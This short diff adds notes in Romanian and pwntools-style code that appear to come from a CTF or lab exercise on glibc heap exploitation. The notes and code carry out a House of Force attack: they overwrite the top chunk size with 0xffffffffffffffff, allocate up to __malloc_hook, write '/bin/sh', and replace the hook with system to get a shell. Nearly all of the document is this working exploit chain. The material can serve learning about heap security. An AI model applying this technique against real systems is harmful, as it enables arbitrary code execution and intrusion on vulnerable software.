@@ -1,0 +1,9 @@
+putem incerca sa dam overwrite la top_chunk cu un numar foarte mare...De ex 0x16*f, acesta fiind cel mai mare numar posibil de pe 64bit.
+Dupa daca avem leak de heap si ceva adresa de libc putem sa incercam sa gasim adresa __malloc_hook
+
+malloc(24, b"A"*24 + p64(0xffffffffffffffff))
+distance = (libc.sym.__malloc_hook - 0x20) - (heap + 0x20)
+malloc(distance, "/bin/sh\x00")
+malloc(24, p64(libc.sym['system']))
+cmd = heap + 0x30
+malloc(cmd, "")
